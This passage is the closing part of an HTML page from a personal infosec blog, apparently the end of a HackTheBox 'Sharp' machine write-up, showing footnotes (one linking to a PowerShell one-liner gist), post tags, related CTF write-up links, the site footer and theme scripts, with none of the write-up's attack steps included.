</span></pre></table></code></div></div><h2 id="footnotes">Footnotes</h2><div class="footnotes" role="doc-endnotes"><ol><li id="fn:1" role="doc-endnote"><p>See more about PowerShell one-liner: https://gist.github.com/m8r0wn/b6654989035af20a1cb777b61fbc29bf <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p></li><li id="fn:2" role="doc-endnote"><p>Proof of Concept <a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a></p></li><li id="fn:3" role="doc-endnote"><p>Virtual Machine <a href="#fnref:3" class="reversefootnote" role="doc-backlink">&#8617;</a></p></li></ol></div></div><div class="post-tail-wrapper text-muted"><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/blog/en/tags/hackthebox/" class="post-tag no-text-decoration" >hackthebox</a> <a href="/blog/en/tags/network/" class="post-tag no-text-decoration" >network</a> <a href="/blog/en/tags/pwn/" class="post-tag no-text-decoration" >pwn</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox - Sharp - Another infosec blog&url=https://legiahuyy.github.io/blog/en/blog/en/posts/HTB-Sharp/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox - Sharp - Another infosec blog&u=https://legiahuyy.github.io/blog/en/blog/en/posts/HTB-Sharp/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HackTheBox - Sharp - Another infosec blog&url=https://legiahuyy.github.io/blog/en/blog/en/posts/HTB-Sharp/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/blog/en/tags/pwn/">pwn</a> <a class="post-tag" href="/blog/en/tags/kma/">kma</a> <a class="post-tag" href="/blog/en/tags/web-pentest/">web pentest</a> <a class="post-tag" href="/blog/en/tags/thoughts/">thoughts</a> <a class="post-tag" href="/blog/en/tags/reverse-engineer/">reverse engineer</a> <a class="post-tag" href="/blog/en/tags/network/">network</a> <a class="post-tag" href="/blog/en/tags/hackthebox/">hackthebox</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Recommend the other 3 posts according to the tags and categories of the current post, if the number is not enough, use the other latest posts to supplement. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/blog/en/posts/ez-bof/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Feb 24 <i class="unloaded">2021-02-24T02:45:00+07:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>A simple BOF - KCSC</h3><div class="text-muted small"><p> Today we are going to test out Ghidra with one of my university pwnie challenge. Info Value Name pwn1 SHA256 d3e77076e7c9c113...</p></div></div></a></div><div class="card"> <a href="/blog/en/posts/RFI-Wrapper/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Feb 24 <i class="unloaded">2021-02-24T02:45:00+07:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>LFI/RFI Wrapper - KCSC</h3><div class="text-muted small"><p> This is the first iteration of my CTF write-up series for the new year. Today we will be solving one of my university’s initial challenges. The task is simple itself but I want to show you the mind...</p></div></div></a></div><div class="card"> <a href="/blog/en/posts/README/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Nov 24, 2020 <i class="unloaded">2020-11-24T03:51:22+07:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>A README.md</h3><div class="text-muted small"><p> Welcome to my personal blog where I can share to people my thoughts and experience about (mostly) technology, research articles and sometimes irrelevant stuff. Topics on this blog are mainly about...</p></div></div></a></div></div></div><!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/blog/en/posts/ez-bof/" class="btn btn-outline-primary"><p>A simple BOF - KCSC</p></a> <span class="btn btn-outline-primary disabled"><p>-</p></span></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/0x7c00">Le Gia Huy</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://github.com" target="_blank">Github Pages</a></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/blog/en/tags/pwn/">pwn</a> <a class="post-tag" href="/blog/en/tags/kma/">kma</a> <a class="post-tag" href="/blog/en/tags/web-pentest/">web pentest</a> <a class="post-tag" href="/blog/en/tags/thoughts/">thoughts</a> <a class="post-tag" href="/blog/en/tags/reverse-engineer/">reverse engineer</a> <a class="post-tag" href="/blog/en/tags/network/">network</a> <a class="post-tag" href="/blog/en/tags/hackthebox/">hackthebox</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/blog/en/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://legiahuyy.github.io/blog/en{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
